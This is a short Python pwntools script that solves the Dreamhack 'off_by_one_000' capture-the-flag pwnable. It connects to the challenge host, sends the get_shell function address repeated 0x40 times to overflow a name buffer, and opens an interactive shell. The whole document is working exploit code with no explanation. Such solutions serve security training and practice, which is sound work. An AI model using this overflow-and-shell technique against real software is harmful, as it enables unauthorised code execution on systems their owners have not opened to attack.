from pwn import *

port = 16344
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/off_by_one_000/problem/off_by_one_000")

getShell_addr = elf.symbols['get_shell']

payload = p32(getShell_addr) * 0x40
rem.sendafter(b'Name: ', payload)
rem.recvuntil(payload)

rem.interactive()